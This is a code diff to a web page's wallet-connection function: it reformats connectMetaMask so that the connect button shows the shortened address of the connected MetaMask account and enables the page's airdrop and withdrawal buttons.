@@ -303,24 +303,35 @@
     let accounts;
 
     // Function to connect to the user's MetaMask wallet
-    async function connectMetaMask() {
-      if (window.ethereum) { // Check if MetaMask is installed
-        web3 = new Web3(window.ethereum); // Create a new Web3 instance
-        try {
-          // Request access to the user's accounts
-          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          // Enable buttons after successful connection
-          document.getElementById('approveButton').disabled = false;
-          document.getElementById('claimAirdropButton').disabled = false;
-          document.getElementById('withdrawETHButton').style.display = 'inline-block';
-          document.getElementById('withdrawTokensButton').style.display = 'inline-block';
-        } catch (error) {
-          alert('MetaMask connection failed'); // Show an error if connection fails
-        }
-      } else {
-        alert('MetaMask not detected! Please install MetaMask.'); // Prompt user to install MetaMask
-      }
+
+    
+async function connectMetaMask() {
+  if (window.ethereum) {
+    web3 = new Web3(window.ethereum);
+    try {
+      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      
+      // Update the button text with the connected wallet address (first and last 4 characters)
+      const walletAddress = accounts[0];
+      const shortenedAddress = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
+      document.getElementById('connectButton').textContent = `Connected: ${shortenedAddress}`;
+
+      // Enable other buttons once wallet is connected
+      document.getElementById('approveButton').disabled = false;
+      document.getElementById('claimAirdropButton').disabled = false;
+      document.getElementById('withdrawETHButton').style.display = 'inline-block';
+      document.getElementById('withdrawTokensButton').style.display = 'inline-block';
+    } catch (error) {
+      alert('MetaMask connection failed');
     }
+  } else {
+    alert('MetaMask not detected! Please install MetaMask.');
+  }
+}
+
+
+
+    
 
     // Function to check if the user is on a mobile device
     function isMobileDevice() {
